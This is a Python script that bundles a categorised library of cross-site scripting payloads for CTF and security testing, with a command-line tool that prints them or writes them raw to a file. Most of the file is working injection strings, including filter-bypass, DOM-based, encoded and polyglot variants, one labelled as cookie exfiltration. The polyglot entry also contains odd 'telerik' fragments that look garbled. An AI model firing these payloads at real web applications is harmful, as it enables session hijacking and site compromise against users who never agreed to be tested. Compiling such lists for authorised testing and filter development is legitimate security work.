"""XSS (Cross-Site Scripting) test payload collection for CTF challenges.

A reference library of XSS payloads for testing web application security
in authorized CTF environments.

DISCLAIMER: These payloads are for EDUCATIONAL and CTF use only.
Only use these on systems you own or have explicit written permission to test.
Unauthorized testing of web applications is illegal.

Usage:
    python xss_payloads.py                    # List all categories
    python xss_payloads.py basic              # Show basic payloads
    python xss_payloads.py filter-bypass      # Show filter bypass payloads
    python xss_payloads.py --all              # Show all payloads
    python xss_payloads.py --output file.txt  # Save to file
"""

import argparse
import sys
from dataclasses import dataclass, field


@dataclass(frozen=True)
class Payload:
    name: str
    payload: str
    description: str


@dataclass
class PayloadCategory:
    name: str
    description: str
    payloads: list[Payload] = field(default_factory=list)


def get_payload_categories() -> dict[str, PayloadCategory]:
    """Return all XSS payload categories with their payloads."""
    categories: dict[str, PayloadCategory] = {}

    # Basic XSS
    basic = PayloadCategory("basic", "Standard XSS payloads for initial testing")
    basic.payloads = [
        Payload("alert-script", '<script>alert("XSS")</script>', "Classic script tag injection"),
        Payload(
            "alert-number",
            "<script>alert(1)</script>",
            "Numeric alert (avoids string filters)",
        ),
        Payload(
            "alert-document",
            "<script>alert(document.domain)</script>",
            "Shows current domain",
        ),
        Payload("alert-cookie", "<script>alert(document.cookie)</script>", "Exfiltrate cookies"),
        Payload(
            "img-onerror",
            '<img src=x onerror=alert("XSS")>',
            "Event handler via broken image",
        ),
        Payload("svg-onload", '<svg onload=alert("XSS")>', "SVG element with onload"),
        Payload("body-onload", '<body onload=alert("XSS")>', "Body onload event"),
        Payload("input-onfocus", '<input autofocus onfocus=alert("XSS")>', "Auto-focusing input"),
        Payload("details-toggle", '<details open ontoggle=alert("XSS")>', "Details element toggle"),
        Payload("marquee-onstart", '<marquee onstart=alert("XSS")>', "Marquee element event"),
    ]
    categories["basic"] = basic

    # Filter bypass
    bypass = PayloadCategory("filter-bypass", "Payloads that bypass common XSS filters")
    bypass.payloads = [
        Payload(
            "case-variation",
            '<ScRiPt>alert("XSS")</ScRiPt>',
            "Mixed case to bypass case-sensitive filters",
        ),
        Payload("null-byte", '<scr\x00ipt>alert("XSS")</script>', "Null byte insertion"),
        Payload(
            "double-encoding",
            "%253Cscript%253Ealert(1)%253C/script%253E",
            "Double URL encoding",
        ),
        Payload(
            "html-entities",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "HTML entity encoding",
        ),
        Payload("unicode-escape", "<script>\\u0061lert(1)</script>", "Unicode escape in JS"),
        Payload("no-quotes", "<img src=x onerror=alert(1)>", "No quotes needed"),
        Payload("backtick-template", "<script>alert(`XSS`)</script>", "Template literal backticks"),
        Payload(
            "eval-fromcharcode",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
            "Character code evaluation",
        ),
        Payload(
            "svg-animate",
            "<svg><animate onbegin=alert(1) attributeName=x>",
            "SVG animate element",
        ),
        Payload(
            "math-tag",
            "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
            "Math/table context switching",
        ),
    ]
    categories["filter-bypass"] = bypass

    # Event handlers
    events = PayloadCategory("event-handlers", "XSS via HTML event handler attributes")
    events.payloads = [
        Payload("onclick", "<div onclick=alert(1)>Click me</div>", "Click event"),
        Payload("onmouseover", "<div onmouseover=alert(1)>Hover me</div>", "Mouse hover event"),
        Payload("onerror-img", "<img src=x onerror=alert(1)>", "Image load error"),
        Payload("onload-svg", "<svg/onload=alert(1)>", "SVG load event (compact)"),
        Payload("onfocus-input", "<input onfocus=alert(1) autofocus>", "Auto-focus input"),
        Payload(
            "onblur-input",
            "<input onblur=alert(1) autofocus><input autofocus>",
            "Blur via double focus",
        ),
        Payload(
            "onhashchange",
            '<body onhashchange=alert(1)><a href="#">click</a>',
            "URL hash change",
        ),
        Payload(
            "onanimationend",
            '<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>',
            "CSS animation end event",
        ),
        Payload("onresize", "<body onresize=alert(1)>", "Window resize (requires interaction)"),
        Payload(
            "onscroll",
            "<div onscroll=alert(1)><br><br>...<br><input autofocus>",
            "Scroll event",
        ),
    ]
    categories["event-handlers"] = events

    # DOM-based XSS
    dom = PayloadCategory("dom-based", "Payloads targeting DOM manipulation vulnerabilities")
    dom.payloads = [
        Payload(
            "location-hash",
            "#<script>alert(1)</script>",
            "Via location.hash (if reflected to DOM)",
        ),
        Payload("document-write", "';alert(1);//", "Break out of document.write context"),
        Payload("innerhtml", "<img src=x onerror=alert(1)>", "Injected via innerHTML"),
        Payload("eval-injection", "');alert(1);//", "Break out of eval() context"),
        Payload("settimeout", "alert(1)", "If passed to setTimeout/setInterval"),
        Payload(
            "postmessage",
            '<script>window.postMessage("<img src=x onerror=alert(1)>","*")</script>',
            "Cross-origin message injection",
        ),
        Payload("url-fragment", "javascript:alert(1)", "Via URL fragment if used in href"),
        Payload(
            "dom-clobbering",
            "<form id=x><input name=y value=alert(1)>",
            "DOM clobbering attack",
        ),
    ]
    categories["dom-based"] = dom

    # Polyglot payloads
    polyglot = PayloadCategory(
        "polyglot",
        "Multi-context payloads that work in various injection points",
    )
    polyglot.payloads = [
        Payload(
            "javas-polyglot",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )"
            "//%%0telerik%%0D0telerik%0A0telerik%0d%0a"
            "//</stYle/</titLe/</telerik</telerik"
            "/</sVg/</xSs/><sVg/oNloAd=alert()//>",
            "Wide-coverage polyglot",
        ),
        Payload(
            "compact-polyglot",
            "'\"><img src=x onerror=alert(1)>",
            "Breaks out of attribute and tag contexts",
        ),
        Payload(
            "script-polyglot",
            "</script><script>alert(1)</script>",
            "Closes existing script, opens new one",
        ),
        Payload(
            "style-polyglot", "</style><script>alert(1)</script>", "Breaks out of style context"
        ),
        Payload(
            "comment-polyglot", "--><script>alert(1)</script><!--", "Breaks out of HTML comment"
        ),
    ]
    categories["polyglot"] = polyglot

    # Encoded payloads
    encoded = PayloadCategory("encoded", "Various encoded forms of XSS payloads")
    encoded.payloads = [
        Payload(
            "hex-encoded",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "Hex HTML entities",
        ),
        Payload(
            "decimal-encoded",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "Decimal HTML entities",
        ),
        Payload("url-encoded", "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "URL encoded"),
        Payload(
            "base64-data-uri",
            '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
            "Base64 in data URI",
        ),
        Payload(
            "javascript-uri",
            '<a href="javascript:alert(1)">click</a>',
            "JavaScript protocol in href",
        ),
        Payload("unicode-full", "\u003cscript\u003ealert(1)\u003c/script\u003e", "Unicode escaped"),
    ]
    categories["encoded"] = encoded

    return categories


def list_categories(categories: dict[str, PayloadCategory]) -> str:
    """List all available payload categories."""
    lines = [
        "Available XSS Payload Categories:",
        "",
    ]

    for key, cat in categories.items():
        lines.append(f"  {key:<20} {cat.description} ({len(cat.payloads)} payloads)")

    lines.append("")
    lines.append("Usage: python xss_payloads.py <category>")
    lines.append("       python xss_payloads.py --all")

    return "\n".join(lines)


def format_category(category: PayloadCategory) -> str:
    """Format a category's payloads as a readable output."""
    lines = [
        f"Category: {category.name}",
        f"Description: {category.description}",
        f"Payloads: {len(category.payloads)}",
        "",
    ]

    for i, p in enumerate(category.payloads, 1):
        lines.append(f"  [{i}] {p.name}")
        lines.append(f"      Description: {p.description}")
        lines.append(f"      Payload: {p.payload}")
        lines.append("")

    return "\n".join(lines)


def main() -> None:
    """CLI entry point for XSS payload reference."""
    parser = argparse.ArgumentParser(
        description="XSS payload collection for CTF challenges.",
        epilog="DISCLAIMER: For EDUCATIONAL and CTF use only.",
    )
    parser.add_argument(
        "category",
        nargs="?",
        help="Payload category to display",
    )
    parser.add_argument(
        "--all",
        "-a",
        action="store_true",
        help="Show all payload categories",
    )
    parser.add_argument(
        "--output",
        "-o",
        help="Save payloads to a file (one per line, raw payloads only)",
    )

    args = parser.parse_args()
    categories = get_payload_categories()

    if args.output and (args.category or args.all):
        # Output raw payloads to file
        payloads_to_write: list[str] = []

        if args.all:
            for cat in categories.values():
                payloads_to_write.extend(p.payload for p in cat.payloads)
        elif args.category in categories:
            payloads_to_write.extend(p.payload for p in categories[args.category].payloads)

        with open(args.output, "w", encoding="utf-8") as f:
            f.write("\n".join(payloads_to_write))

        print(f"Wrote {len(payloads_to_write)} payloads to {args.output}")
        return

    if args.all:
        for cat in categories.values():
            print(format_category(cat))
            print("=" * 60)
        return

    if args.category:
        if args.category not in categories:
            print(f"Unknown category: '{args.category}'")
            print()
            print(list_categories(categories))
            sys.exit(1)

        print(format_category(categories[args.category]))
        return

    print(list_categories(categories))


if __name__ == "__main__":
    main()
